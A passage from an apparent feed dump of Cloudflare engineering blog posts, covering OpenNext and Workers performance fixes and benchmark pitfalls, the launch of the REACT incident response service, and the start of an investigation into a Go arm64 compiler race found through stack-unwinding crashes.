Cloudflare OpenNext adapter has been needlessly copying every chunk of streamed output data as it’s passed out of the renderer and into the Workers runtime to return to users. Given this benchmark returns a 5 MB result on every request, that's a lot of data being copied!In other places, we found that arrays of internal Buffer instances were being copied and concatenated using Buffer.concat for no other reason than to get the total number of bytes in the collection. That is, we spotted code of the form getBody().length. The function getBody() would concatenate a large number of buffers into a single buffer and return it, without storing the buffer anywhere. So, all that work was being done just to read the overall length. Obviously this was not intended, and fixing it was an easy win.We've started opening a series of pull requests in OpenNext to fix these issues, and others in hot paths, removing some unnecessary allocations and copies:Improving streaming response performanceReduce allocations of streamsOptimize readable/writable stream pipingCache expensive compute on OpenNext.jsImprove composable-cache performanceImprove performance of OpenNext.js convertersAvoid slow-mode on frequently accessed objects Avoid copying/allocation extra header objectsAvoid unnecessary buffer copies on responsesCache regexes to avoid GC pressureWe're not done. We intend to keep iterating through OpenNext code, making improvements wherever they’re needed – not only in the parts that run on Workers. Many of these improvements apply to other OpenNext platforms. The shared goal of OpenNext is to make NextJS as fast as possible regardless of where you choose to run your code. Inefficient Streams Adapters Much of the Next.js code was written to use Node.js's APIs for byte streams. Workers, however, prefers the web-standard Streams API, and uses it to represent HTTP request and response bodies. This necessitates using adapters to convert between the two APIs. When investigating the performance bottlenecks, we found a number of examples where inefficient streams adapters are being needlessly applied. For example: const stream = Readable.toWeb(Readable.from(res.getBody())) res.getBody() was performing a Buffer.concat(chunks) to copy accumulated chunks of data into a new Buffer, which was then passed as an iterable into a Node.js stream.Readable that was then wrapped by an adapter that returns a ReadableStream. While these utilities do serve a useful purpose, this becomes a data buffering nightmare since both Node.js streams and Web streams each apply their own internal buffers! Instead we can simply do: const stream = ReadableStream.from(chunks); This returns a ReadableStream directly from the accumulated chunks without additional copies, extraneous buffering, or passing everything through inefficient adaptation layers.In other places we see that Next.js and React make extensive use of ReadableStream to pass bytes through, but the streams being created are value-oriented rather than byte-oriented! For example, const readable = new ReadableStream({ pull(controller) { controller.enqueue(chunks.shift()); if (chunks.length === 0) { controller.close(); } }); // Default highWaterMark is 1! Seems perfectly reasonable. However, there's an issue here. If the chunks are Buffer or Uint8Array instances, every instance ends up being a separate read by default. So if the chunk is only a single byte, or 1000 bytes, that's still always two reads. By converting this to a byte stream with a reasonable high water mark, we can make it possible to read this stream much more efficiently: const readable = new ReadableStream({ type: 'bytes', pull(controller) { controller.enqueue(chunks.shift()); if (chunks.length === 0) { controller.close(); } }, { highWaterMark: 4096 }); Now, the stream can be read as a stream of bytes rather than a stream of distinct JavaScript values, and the individual chunks can be coalesced internally into 4096 byte chunks, making it possible to optimize the reads much more efficiently. Rather than reading each individual enqueued chunk one at a time, the ReadableStream will proactively call pull() repeatedly until the highWaterMark is reached. Reads then do not have to ask the stream for one chunk of data at a time.While it would be best for the rendering pipeline to be using byte streams and paying attention to back pressure signals more, our implementation can still be tuned to better handle cases like this.The bottom line? We've got some work to do! There are a number of improvements to make in the implementation of OpenNext and the adapters that allow it to work on Cloudflare that we will continue to investigate and iterate on. We've made a handful of these fixes already and we're already seeing improvements. Soon we also plan to start submitting patches to Next.js and React to make further improvements upstream that will ideally benefit the entire ecosystem. JSON parsing Aside from buffer allocations and streams, one additional item stood out like a sore thumb in the profiles: JSON.parse() with a reviver function. This is used in both React and Next.js and in our profiling this was significantly slower than it should be. We built a microbenchmark and found that JSON.parse with a reviver argument recently got even slower when the standard added a third argument to the reviver callback to provide access to the JSON source context.For those unfamiliar with the reviver function, it allows an application to effectively customize how JSON is parsed. But it has drawbacks. The function gets called on every key-value pair included in the JSON structure, including every individual element of an Array that gets serialized. In Theo's NextJS benchmark, in any single request, it ends up being called well over 100,000 times!Even though this problem affects all platforms, not just ours, we decided that we weren't just going to accept it. After all, we have contributors to V8 on the Workers runtime team! We've upstreamed a V8 patch that can speed up JSON.parse() with revivers by roughly 33 percent. That should be in V8 starting with version 14.3 (Chrome 143) and can help everyone using V8, not just Cloudflare: Node.js, Chrome, Deno, the entire ecosystem. If you are not using Cloudflare Workers or didn't change the syntax of your reviver you are currently suffering under the red performance bar.We will continue to work with framework authors to reduce overhead in hot paths. Some changes belong in the frameworks, some belong in the engine, some in our platform. Node.js's trigonometry problem We are engineers, and we like to solve engineering problems — whether our own, or for the broader community.Theo's benchmarks were actually posted in response to a different benchmark by another author which compared Cloudflare Workers against Vercel. The original benchmark focused on calling trigonometry functions (e.g. sine and cosine) in a tight loop. In this benchmark, Cloudflare Workers performed 3x faster than Node.js running on Vercel.The author of the original benchmark offered this as evidence that Cloudflare Workers are just faster. Theo disagreed, and so did we. We expect to be faster, but not by 3x! We don't implement math functions ourselves; these come with V8. We weren't happy to just accept the win, so we dug in.It turns out that Node.js is not using the latest, fastest path for these functions. Node.js can be built with either the clang or gcc compilers, and is written to support a broader range of operating systems and architectures than Workers. This means that Node.js' compilation often ends up using a lowest-common denominator for some things in order to provide support for the broadest range of platforms. V8 includes a compile-time flag that, in some configurations, allows it to use a faster implementation of the trig functions. In Workers, mostly by coincidence, that flag is enabled by default. In Node.js, it is not. We've opened a pull request to enable the flag in Node.js so that everyone benefits, at least on platforms where it can be supported.Assuming that lands, and once AWS Lambda and Vercel are able to pick it up, we expect this specific gap to go away, making these operations faster for everyone. This change won't benefit our customers, since Cloudflare Workers already uses the faster trig functions, but a bug is a bug and we like making everything faster. Benchmarks are hard Even the best benchmarks have bias and tradeoffs. It's difficult to create a benchmark that is truly representative of real-world performance, and all too easy to misinterpret the results of benchmarks that are not. We particularly liked Planetscale's take on this subject.These specific CPU-bound tests are not an ideal choice to represent web applications. Theo even notes this in his video. Most real-world applications on Workers and Vercel are bound by databases, downstream services, network, and page size. End user experience is what matters. CPU is one piece of that picture. That said, if a benchmark shows us slower, we take it seriously.While the benchmarks helped us find and fix many real problems, we also found a few problems with the benchmarks themselves, which contributed to the apparent disparity in speed: Running locally The benchmark is designed to be run on your laptop, from which it hits Cloudflare's and Vercel's servers over the Internet. It makes the assumption that latency observed from the client is a close enough approximation of server-side CPU time. The reasons are fair: As Theo notes, Cloudflare does not permit an application to measure its own CPU time, in order to prevent timing side channel attacks. Actual CPU time can be seen in logs after the fact, but gathering those may be a lot of work. It's just easier to measure time from the client.However, as Cloudflare and Vercel are hosted from different data centers, the network latency to each can be a factor in the benchmark, and this can skew the results. Typically, this effect will favor Cloudflare, because Cloudflare can run your Worker in locations spread across 330+ cities worldwide, and will tend to choose the closest one to you. Vercel, on the other hand, usually places compute in a central location, so latency will vary depending on your distance from that location.For our own testing, to minimize this effect, we ran the benchmark client from a VM on AWS located in the same data center as our Vercel instances. Since Cloudflare is well-connected to every AWS location, we think this should have eliminated network latency from the picture. We chose AWS's us-east-1 / Vercel's iad1 for our test as it is widely seen as the default choice; any other choice could draw questions about cherry-picking. Not all CPUs are equal Cloudflare's servers aren't all identical. Although we refresh them aggressively, there will always be multiple generations of hardware in production at any particular time. Currently, this includes generations 10, 11, and 12 of our server hardware.Other cloud providers are no different. No cloud provider simply throws away all their old servers every time a new version becomes available.Of course, newer CPUs run faster, even for single-threaded workloads. The differences are not as large as they used to be 20-30 years ago, but they are not nothing. As such, an application may get (a little bit) lucky or unlucky depending on what machine it is assigned to.In cloud environments, even identical CPUs can yield different performance depending on circumstances, due to multitenancy. The server your application is assigned to is running many others as well. In AWS Lambda, a server may be running hundreds of applications; in Cloudflare, with our ultra-efficient runtime, a server may be running thousands. These \"noisy neighbors\" won't share the same CPU core as your app, but they may share other resources, such as memory bandwidth. As a result, performance can vary.It's important to note that these problems create correlated noise. That is, if you run the test again, the application is likely to remain assigned to the same machines as before – this is true of both Cloudflare and Vercel. So, this noise cannot be corrected by simply running more iterations. To correct for this type of noise on Cloudflare, one would need to initiate requests from a variety of geographic locations, in order to hit different Cloudflare data centers and therefore different machines. But, that is admittedly a lot of work. (We are not familiar with how best to get an application to switch machines on Vercel.) A Next.js config bug The Cloudflare version of the NextJS benchmark was not configured to use force-dynamic while the Vercel version was. This triggered curious behavior. Our understanding is that pages which are not \"dynamic\" should normally be rendered statically at build time. With OpenNext, however, it appears the pages are still rendered dynamically, but if multiple requests for the same page are received at the same time, OpenNext will only invoke the rendering once. Before we made the changes to fix our scheduling algorithm to avoid sending too many requests to the same isolate, this behavior may have somewhat counteracted that problem. Theo reports that he had disabled force-dynamic in the Cloudflare version specifically for this reason: with it on, our results were so bad as to appear outright broken, so he intentionally turned it off.Ironically, though, once we fixed the scheduling issue, using \"static\" rendering (i.e. not enabling force-dynamic) hurt Cloudflare's performance for other reasons. It seems that when OpenNext renders a \"cacheable\" page, streaming of the response body is inhibited. This interacted poorly with a property of the benchmark client: it measured time-to-first-byte (TTFB), rather than total request/response time. When running in dynamic mode – as the test did on Vercel – the first byte would be returned to the client before the full page had been rendered. The rest of the rendering would happen as bytes streamed out. But with OpenNext in non-dynamic mode, the entire payload was rendered into a giant buffer upfront, before any bytes were returned to the client.Due to the TTFB behavior of the benchmark client, in dynamic mode, the benchmark actually does not measure the time needed to fully render the page. We became suspicious when we noticed that Vercel's observability tools indicated more CPU time had been spent than the benchmark itself had reported.One option would have been to change the benchmarks to use TTLB instead – that is, wait until the last byte is received before stopping the timer. However, this would make the benchmark even more affected by network differences: The responses are quite large, ranging from 2MB to 15MB, and so the results could vary depending on the bandwidth to the provider. Indeed, this would tend to favor Cloudflare, but as the point of the test is to measure CPU speed, not bandwidth, it would be an unfair advantage.Once we changed the Cloudflare version of the test to use force-dynamic as well, matching the Vercel version, the streaming behavior then matched, making the request fair. This means that neither version is actually measuring the cost of rendering the full page to HTML, but at least they are now measuring the same thing.As a side note, the original behavior allowed us to spot that OpenNext has a couple of performance bottlenecks in its implementation of the composable cache it uses to deduplicate rendering requests. While fixes to these aren't going to impact the numbers for this particular set of benchmarks, we're working on improving those pieces also. A React SSR config bug The React SSR benchmark contained a more basic configuration error. React inspects the environment variable NODE_ENV to decide whether the environment is \"production\" or a development environment. Many Node.js-based environments, including Vercel, set this variable automatically in production. Many frameworks, such as OpenNext, automatically set this variable for Workers in production as well. However, the React SSR benchmark was written against lower-level React APIs, not using any framework. In this case, the NODE_ENV variable wasn't being set at all.And, unfortunately, when NODE_ENV is not set, React defaults to \"dev mode\", a mode that contains extra debugging checks and is therefore much slower than production mode. As a result, the numbers for Workers were much worse than they should have been.Arguably, it may make sense for Workers to set this variable automatically for all deployed workers, particularly when Node.js compatibility is enabled. We are looking into doing this in the future, but for now we've updated the test to set it directly. What we’re going to do next Our improvements to the Workers Runtime are already live for all workers, so you do not need to change anything. Many apps will already see faster, steadier tail latency on compute heavy routes with less jitter during bursts. In places where garbage collection improved, some workloads will also use fewer billed CPU seconds.We also sent Theo a pull request to update OpenNext with our improvements there, and with other test fixes.But we're far from done. We still have work to do to close the gap between OpenNext and Next.js on Vercel – but given the other benchmark results, it's clear we can get there. We also have plans for further improvements to our scheduling algorithm, so that requests almost never block each other. We will continue to improve V8, and even Node.js – the Workers team employs multiple core contributors to each project. Our approach is simple: improve open source infrastructure so that everyone gets faster, then make sure our platform makes the most of those improvements.And, obviously, we'll be writing more benchmarks, to make sure we're catching these kinds of issues ourselves in the future. If you have a benchmark that shows Workers being slower, send it to us with a repro. We will profile it, fix what we can upstream, and share back what we learn!Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Cloudflare WorkersDeveloper PlatformDevelopers\nSeptember 30, 2025 3:50 PMPayload on Workers: a full-fledged CMS, running entirely on Cloudflare’s stackWe demonstrate how the open-source Payload CMS was ported to run entirely on Cloudflare's developer platform....By Jason Kincaid, Ricardo TavaresCloudflare Workers\nSeptember 29, 2025 2:00 PM15 years of helping build a better Internet: a look back at Birthday Week 2025Rust-powered core systems, post-quantum upgrades, developer access for students, PlanetScale integration, open-source partnerships, and our biggest internship program ever — 1,111 interns in 2026....By Nikita Cano, Korinne AlpersBirthday Week, Partners, Developer Platform, Workers Launchpad, Performance, Security, Cache, Speed, Developers, AI, 1.1.1.1, Application Security, Application Services, Bots, CDN, Cloudflare for Startups, Cloudflare One, Cloudflare Zero Trust, Cloudflare Workers\nSeptember 26, 2025 1:00 PMCode Mode: the better way to use MCPIt turns out we've all been using MCP wrong. Most agents today use MCP by exposing the \"tools\" directly to the LLM....By Kenton Varda, Sunil PaiAI, Birthday Week, Cloudflare Workers, Agents, MCP\nSeptember 26, 2025 1:00 PMEliminating Cold Starts 2: shard and conquerWe reduced Cloudflare Workers cold starts by 10x by optimistically routing to servers with already-loaded Workers. Learn how we did it here....By Harris HancockBirthday Week, Cap'n Proto, Cloudflare Workers, Engineering, TLS", "timestamp": "2025-10-21T13:33:32.529815"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "Introducing REACT: Why We Built an Elite Incident Response Team", "url": "https://blog.cloudflare.com/introducing-react-why-we-built-an-elite-incident-response-team/", "published": "Thu, 09 Oct 2025 14:00:00 GMT", "content": "Introducing REACT: Why We Built an Elite Incident Response Team2025-10-09Chris O’RourkeUtsav AdhikariBlake DarchéJacob CrispTrevor Lyness6 min readCloudforce One’s mission is to help defend the Internet. In Q2’25 alone, Cloudflare stopped an average of 190 billion cyber threats every single day. But real-world customer experiences showed us that stopping attacks at the edge isn’t always enough. We saw ransomware disrupt financial operations, data breaches cripple real estate firms, and misconfigurations cause major data losses.In each case, the real damage occurred inside networks.These internal breaches uncovered another problem: customers had to hand off incidents to separate internal teams for investigation and remediation. Those handoffs created delays and fractured the response. The result was a gap that attackers could exploit. Critical context collected at the edge didn’t reach the teams managing cleanup, and valuable time was lost. Closing this gap has become essential, and we recognized the need to take responsibility for providing customers with a more unified defense.Today, Cloudforce One is launching a new suite of incident response and security services to help organizations prepare for and respond to breaches.These services are delivered by Cloudforce One REACT (Respond, Evaluate, Assess, Consult Team), a group of seasoned responders and security veterans who investigate threats, hunt adversaries, and work closely with executive leadership to guide response and decision-making. Customers already trust Cloudforce One to provide industry-leading threat intelligence, proactively identifying and neutralizing the most sophisticated threats. REACT extends that partnership, bringing our expertise directly to customer environments to stop threats wherever they occur. In this post, we’ll introduce REACT, explain how it works, detail the top threats our team has observed, and show you how to engage our experts directly for support.Our goal is simple: to provide an end-to-end security partnership. We want to eliminate the painful gap between defense and recovery. Now, customers can get everything from proactive preparation to decisive incident response and full recovery—all from the partner you already trust to protect your infrastructure.It’s time to move beyond fragmented responses and into one unified, powerful defense. How REACT works REACT services consist of two main components: Security advisory services to prepare for incidents and incident response for emergency situations. A breakdown of the Cloudforce One incident readiness and response service offerings.Advisory services are designed to assess and improve an organization's security posture and readiness. These include proactive threat hunting, backed by Cloudflare’s real-time global threat intelligence, to find existing compromises, tabletop exercises to test response plans against simulated attacks, and both incident readiness and maturity assessments to identify and address systemic weaknesses.The Incident Response component is initiated during an active security crisis. The team specializes in handling a range of complex threats, including APT and nation-state activity, ransomware, insider threats, and business email compromise. The response is also informed by Cloudflare's threat intelligence and, as a network-native service, allows responders to deploy mitigation measures directly at the Cloudflare edge for faster containment.For organizations requiring guaranteed availability, incident response retainers are offered. These retainers provide priority response, the development of tailored playbooks, and ongoing advisory support.Cloudflare’s REACT services are vendor-agnostic in their scope. We are making REACT available to both existing Cloudflare customers and non-customers, regardless of their current technology stack, and regardless of whether their environment is on-premise, public cloud, or hybrid. What makes Cloudflare's approach different? Our new service provides significant advantages over traditional incident response, where engagement and data sharing occur over separate, out-of-band channels. The integration of the service into the platform enables a more efficient and effective response to threats.The core differentiators of this approach are:Unmatched threat visibility. With roughly 20% of the web sitting behind Cloudflare's network, Cloudforce One has unique visibility into emerging attacks as they unfold globally. This lets REACT accelerate their investigations and quickly correlate incident details with emerging attack vectors and known adversary tactics.Network-native mitigation. The service is designed for network-native response. This allows the team, with customer authorization, to deploy mitigations directly at the Cloudflare edge, such as a WAF rule or Secure Web Gateway policy. This capability reduces the time between threat identification and containment. All response actions are tracked within the dashboard for full visibility.Service delivery by proven experts. Cloudforce One is composed of seasoned threat researchers, consultants, and incident responders. The team has a documented history of managing complex security incidents, including nation-state activity and sophisticated financial fraud.Vendor-agnostic scope. While managed through the Cloudflare dashboard, the scope of the response is vendor-agnostic. The team is equipped to conduct investigations and coordinate remediation across diverse customer environments, including on-premise, public cloud, and hybrid infrastructures. Key Threats Seen During Engagements So Far Analysis of security engagements by the REACT team over the last six months reveals three prevalent and high-impact trends. The data indicates that automated defenses, while critical, must be supplemented by specialized incident response capabilities to effectively counter these specific threats. High-impact insider threats The REACT team has seen a significant number of incidents driven by insiders who use trusted access to bypass typical security controls. These threats are difficult to detect as they often combine technical actions with non-technical motivations. Recent scenarios observed are:Disgruntled or current employees using their specialized, trusted access to execute targeted, destructive attacks.Financially motivated insiders who are compensated by external actors to exfiltrate data or compromise internal systems.State sponsored operatives gain trusted, privileged access via fraudulent remote work roles to exfiltrate data, conduct espionage, and steal funds for illicit regime financing. Ransomware The REACT team has observed that ransomware continues to be a primary driver of high-severity incidents, posing an existential threat to nearly every sector. Common themes observed include:Disruption of core operations in the financial sector via hostage-taking of critical systems. Paralysis of business functions and compromise of client data in the real estate industry, leading to significant downtime and regulatory scrutiny.Broad impact across all industry verticals. Stopping these attacks demands not only robust defenses but also a well-rehearsed recovery plan that cuts time-to-restoration to hours, not weeks. Application security and supply chain breaches The REACT team has also seen a significant increase in incidents originating at the application layer. These threats typically manifest in two primary areas: vulnerabilities within an organization’s own custom-developed (‘vibe coded’) applications, and security failures originating from their third-party supply chain:Vibe coding: The practice of providing natural language prompts to AI models to generate code can produce critical vulnerabilities which can be exploited by threat actors using techniques like remote code execution (RCE), memory corruption, and SQL injection.SaaS supply chain risk: A compromise at a critical third-party vendor that exposes sensitive data, such as when attackers used a stolen Salesloft OAuth token to exfiltrate customer support cases from their clients' Salesforce instances. Integrated directly into your Cloudflare dashboard Starting today, Cloudflare Enterprise customers will find a new \"Incident Response Services\" tab in the Threat intelligence navigation page in the Cloudflare dashboard. This dashboard integration ensures that critical security information and the ability to engage our incident response team are always at your fingertips, streamlining the process of getting expert help when it matters most. Screenshot of the Cloudforce One Incident Response Services page in the Cloudflare dashboardRetainer customers will benefit from a dedicated Under Attack page, which allows customers to contact Cloudforce One team during an active incident. In the event of an active incident, a simple \"Request Help\" button in our “Under Attack” page will immediately page our on-call incident responders to get you the help you need without delay. Screenshot on the Under Attack button in the Cloudflare dashboard Screenshot of the Emergency Incident Response page in the Cloudflare dashboardFor proactive needs, you can also easily submit requests for security advisory services through the Cloudflare dashboard: Confirmation of the successful service request submission How to engage with Cloudforce One To learn more about REACT, existing Enterprise customers can explore the dedicated Incident Response section in the Cloudflare dashboard. For new inquiries regarding proactive partnerships and retainers, please contact Cloudflare sales. If you are facing an active security crisis and need the REACT team on the ground, please contact us immediately.Cloudflare's connectivity cloud protects entire corporate networks, helps customers build Internet-scale applications efficiently, accelerates any website or Internet application, wards off DDoS attacks, keeps hackers at bay, and can help you on your journey to Zero Trust.Visit 1.1.1.1 from any device to get started with our free app that makes your Internet faster and safer.To learn more about our mission to help build a better Internet, start here. If you're looking for a new career direction, check out our open positions. Cloudforce OneIncident ResponseDigital ForensicsThreat Intelligence\nAugust 29, 2025 2:05 PMAutomating threat analysis and response with Cloudy Cloudy now supercharges analytics investigations and Cloudforce One threat intelligence! Get instant insights from threat events and APIs on APTs, DDoS, cybercrime & more - powered by Workers AI....By Alexandra Moraru, Harsh Saxena, Steve James, Nick Downie, Levi KipkeAI Week, Cloudy, Cloudforce One, Threat Intelligence, Security, Workers AI\nAugust 04, 2025 1:00 PMPerplexity is using stealth, undeclared crawlers to evade website no-crawl directivesPerplexity is repeatedly modifying their user agent and changing IPs and ASNs to hide their crawling activity, in direct conflict with explicit no-crawl preferences expressed by websites....By Gabriel Corral, Vaibhav Singhal, Brian Mitchell, Reid TatorisCloudforce One, Threat Intelligence, AI Bots, Bots, AI, Bot Management, Security, Generative AI\nMarch 18, 2025 1:10 PMUnleashing improved context for threat actor activity with our Cloudforce One threat events platformGain real-time insights with our new threat events platform. This tool empowers your cybersecurity defense with actionable intelligence to stay ahead of attacks and protect your critical assets....By Alexandra Moraru, Blake Darché, Emilia YoffieSecurity Week, Security, Threat Intelligence, Cloudforce One, Intel, Threats, Context\nMarch 17, 2025 1:00 PMEnhanced security and simplified controls with automated botnet protection, cipher suite selection, and URL Scanner updatesEnhanced security, simplified control! This Security Week, Cloudflare unveils automated botnet protection, flexible cipher suites, and an upgraded URL Scanner....By Alexandra Moraru, Mia Malden, Yomna Shousha, Sofia CarditaSecurity Week, URL Scanner, Threat Intelligence, Security", "timestamp": "2025-10-21T13:33:33.306023"}
{"source": "blog", "feed": "https://blog.cloudflare.com/rss/", "title": "How we found a bug in Go's arm64 compiler", "url": "https://blog.cloudflare.com/how-we-found-a-bug-in-gos-arm64-compiler/", "published": "Wed, 08 Oct 2025 14:00:00 GMT", "content": "How we found a bug in Go's arm64 compiler2025-10-08Thea Heinen10 min readThis post is also available in 日本語.Every second, 84 million HTTP requests are hitting Cloudflare across our fleet of data centers in 330 cities. It means that even the rarest of bugs can show up frequently. In fact, it was our scale that recently led us to discover a bug in Go's arm64 compiler which causes a race condition in the generated code.This post breaks down how we first encountered the bug, investigated it, and ultimately drove to the root cause. Investigating a strange panic We run a service in our network which configures the kernel to handle traffic for some products like Magic Transit and Magic WAN. Our monitoring watches this closely, and it started to observe very sporadic panics on arm64 machines.We first saw one with a fatal error stating that traceback did not unwind completely. That error suggests that invariants were violated when traversing the stack, likely because of stack corruption. After a brief investigation we decided that it was probably rare stack memory corruption. This was a largely idle control plane service where unplanned restarts have negligible impact, and so we felt that following up was not a priority unless it kept happening.And then it kept happening. Coredumps per hour When we first saw this bug we saw that the fatal errors correlated with recovered panics. These were caused by some old code which used panic/recover as error handling. At this point, our theory was: All of the fatal panics happen within stack unwinding.We correlated an increased volume of recovered panics with these fatal panics.Recovering a panic unwinds goroutine stacks to call deferred functions.A related Go issue (#73259) reported an arm64 stack unwinding crash.Let’s stop using panic/recover for error handling and wait out the upstream fix?So we did that and watched as fatal panics stopped occurring as the release rolled out. Fatal panics gone, our theoretical mitigation seemed to work, and this was no longer our problem. We subscribed to the upstream issue so we could update when it was resolved and put it out of our minds.But, this turned out to be a much stranger bug than expected. Putting it out of our minds was premature as the same class of fatal panics came back at a much higher rate. A month later, we were seeing up to 30 daily fatal panics with no real discernible cause; while that might account for only one machine a day in less than 10% of our data centers, we found it concerning that we didn’t understand the cause. The first thing we checked was the number of recovered panics, to match our previous pattern, but there were none. More interestingly, we could not correlate this increased rate of fatal panics with anything. A release? Infrastructure changes? The position of Mars? At this point we felt like we needed to dive deeper to better understand the root cause. Pattern matching and hoping was clearly insufficient. We saw two classes of this bug -- a crash while accessing invalid memory and an explicitly checked fatal error. Fatal Error goroutine 153 gp=0x4000105340 m=324 mp=0x400639ea08 [GC worker (active)]: /usr/local/go/src/runtime/asm_arm64.s:244 +0x6c fp=0x7ff97fffe870 sp=0x7ff97fffe860 pc=0x55558d4098fc runtime.systemstack(0x0) /usr/local/go/src/runtime/mgc.go:1508 +0x68 fp=0x7ff97fffe860 sp=0x7ff97fffe810 pc=0x55558d3a9408 runtime.gcBgMarkWorker.func2() /usr/local/go/src/runtime/mgcmark.go:1102 runtime.gcDrainMarkWorkerIdle(...) /usr/local/go/src/runtime/mgcmark.go:1188 +0x434 fp=0x7ff97fffe810 sp=0x7ff97fffe7a0 pc=0x55558d3ad514 runtime.gcDrain(0x400005bc50, 0x7) /usr/local/go/src/runtime/mgcmark.go:212 +0x1c8 fp=0x7ff97fffe7a0 sp=0x7ff97fffe6f0 pc=0x55558d3ab248 runtime.markroot(0x400005bc50, 0x17e6, 0x1) /usr/local/go/src/runtime/mgcmark.go:238 +0xa8 fp=0x7ff97fffe6f0 sp=0x7ff97fffe6a0 pc=0x55558d3ab578 runtime.markroot.func1() /usr/local/go/src/runtime/mgcmark.go:887 +0x290 fp=0x7ff97fffe6a0 sp=0x7ff97fffe560 pc=0x55558d3acaa0 runtime.scanstack(0x4014494380, 0x400005bc50) /usr/local/go/src/runtime/traceback.go:447 +0x2ac fp=0x7ff97fffe560 sp=0x7ff97fffe4d0 pc=0x55558d3eeb7c runtime.(*unwinder).next(0x7ff97fffe5b0?) /usr/local/go/src/runtime/traceback.go:566 +0x110 fp=0x7ff97fffe4d0 sp=0x7ff97fffe490 pc=0x55558d3eed40 runtime.(*unwinder).finishInternal(0x7ff97fffe4f8?) /usr/local/go/src/runtime/panic.go:1073 +0x38 fp=0x7ff97fffe490 sp=0x7ff97fffe460 pc=0x55558d403388 runtime.throw({0x55558de6aa27?, 0x7ff97fffe638?}) runtime stack: fatal error: traceback did not unwind completely stack=[0x4015d6a000-0x4015d8a000 runtime: g8221077: frame.sp=0x4015d784c0 top=0x4015d89fd0 Segmentation fault goroutine 187 gp=0x40003aea80 m=13 mp=0x40003ca008 [GC worker (active)]: /usr/local/go/src/runtime/asm_arm64.s:244 +0x6c fp=0x7fff2afde870 sp=0x7fff2afde860 pc=0x55557e2d98fc runtime.systemstack(0x0) /usr/local/go/src/runtime/mgc.go:1489 +0x94 fp=0x7fff2afde860 sp=0x7fff2afde810 pc=0x55557e279434 runtime.gcBgMarkWorker.func2() /usr/local/go/src/runtime/mgcmark.go:1112 runtime.gcDrainMarkWorkerDedicated(...) /usr/local/go/src/runtime/mgcmark.go:1188 +0x434 fp=0x7fff2afde810 sp=0x7fff2afde7a0 pc=0x55557e27d514 runtime.gcDrain(0x4000059750, 0x3) /usr/local/go/src/runtime/mgcmark.go:212 +0x1c8 fp=0x7fff2afde7a0 sp=0x7fff2afde6f0 pc=0x55557e27b248 runtime.markroot(0x4000059750, 0xb8, 0x1) /usr/local/go/src/runtime/mgcmark.go:238 +0xa8 fp=0x7fff2afde6f0 sp=0x7fff2afde6a0 pc=0x55557e27b578 runtime.markroot.func1() /usr/local/go/src/runtime/mgcmark.go:887 +0x290 fp=0x7fff2afde6a0 sp=0x7fff2afde560 pc=0x55557e27caa0 runtime.scanstack(0x40042cc000, 0x4000059750) /usr/local/go/src/runtime/traceback.go:458 +0x188 fp=0x7fff2afde560 sp=0x7fff2afde4d0 pc=0x55557e2bea58 runtime.(*unwinder).next(0x7fff2afde5b0) goroutine 0 gp=0x40003af880 m=13 mp=0x40003ca008 [idle]: PC=0x55557e2bea58 m=13 sigcode=1 addr=0x118 SIGSEGV: segmentation violation Now we could observe some clear patterns. Both errors occur when unwinding the stack in (*unwinder).next. In one case we saw an intentional fatal error as the runtime identified that unwinding could not complete and the stack was in a bad state. In the other case there was a direct memory access error that happened while trying to unwind the stack. The segfault was discussed in the GitHub issue and a Go engineer identified it as dereference of a go scheduler struct, m, when unwinding. A review of Go scheduler structs Go uses a lightweight userspace scheduler to manage concurrency. Many goroutines are scheduled on a smaller number of kernel threads – this is often referred to as M:N scheduling. Any individual goroutine can be scheduled on any kernel thread. The scheduler has three core types – g (the goroutine), m (the kernel thread, or “machine”), and p (the physical execution context, or “processor”). For a goroutine to be scheduled a free m must acquire a free p, which will execute a g. Each g contains a field for its m if it is currently running, otherwise it will be nil. This is all the context needed for this post but the go runtime docs explore this more comprehensively. At this point we can start to make inferences on what’s happening: the program crashes because we try to unwind a goroutine stack which is invalid. In the first backtrace, if a return address is null, we call finishInternal and abort because the stack was not fully unwound. The segmentation fault case in the second backtrace is a bit more interesting: if instead the return address is non-zero but not a function then the unwinder code assumes that the goroutine is currently running. It'll then dereference m and fault by accessing m.incgo (the offset of incgo into struct m is 0x118, the faulting memory access). What, then, is causing this corruption? The traces were difficult to get anything useful from – our service has hundreds if not thousands of active goroutines. It was fairly clear from the beginning that the panic was remote from the actual bug. The crashes were all observed while unwinding the stack and if this were an issue any time the stack was unwound on arm64 we would be seeing it in many more services. We felt pretty confident that the stack unwinding was happening correctly but on an invalid stack. Our investigation stalled for a while at this point – making guesses, testing guesses, trying to infer if the panic rate went up or down, or if nothing changed. There was a known issue on Go’s GitHub issue tracker which matched our symptoms almost exactly, but what they discussed was mostly what we already knew. At some point when looking through the linked stack traces we realized that their crash referenced an old version of a library that we were also using – Go Netlink. goroutine 1267 gp=0x4002a8ea80 m=nil [runnable (scan)]: runtime.asyncPreempt2() /usr/local/go/src/runtime/preempt.go:308 +0x3c fp=0x4004cec4c0 sp=0x4004cec4a0 pc=0x46353c runtime.asyncPreempt() /usr/local/go/src/runtime/preempt_arm64.s:47 +0x9c fp=0x4004cec6b0 sp=0x4004cec4c0 pc=0x4a6a8c github.com/vishvananda/netlink/nl.(*NetlinkSocket).Receive(0x14360300000000?) /go/pkg/mod/github.com/!data!dog/[email protected]/nl/nl_linux.go:803 +0x130 fp=0x4004cfc710 sp=0x4004cec6c0 pc=0xf95de0 We spot-checked a few stack traces and confirmed the presence of this Netlink library. Querying our logs showed that not only did we share a library – every single segmentation fault we observed had happened while preempting NetlinkSocket.Receive. What’s (async) preemption? In the prehistoric era of Go (<=1.13) the runtime was cooperatively scheduled. A goroutine would run until it decided it was ready to yield to the scheduler – usually due to explicit calls to runtime.Gosched() or injected yield points at function calls/IO operations. Since Go 1.14 the runtime instead does async preemption. The Go runtime has a thread sysmon which tracks the runtime of goroutines and will preempt any that run for longer than 10ms (at time of writing). It does this by sending SIGURG to the OS thread and in the signal handler will modify the program counter and stack to mimic a call to asyncPreempt.At this point we had two broad theories:This is a Go Netlink bug – likely due to unsafe.Pointer usage which invoked undefined behavior but is only actually broken on arm64This is a Go runtime bug and we're only triggering it in NetlinkSocket.Receive for some reasonAfter finding the same bug publicly reported upstream, we were feeling confident this was caused by 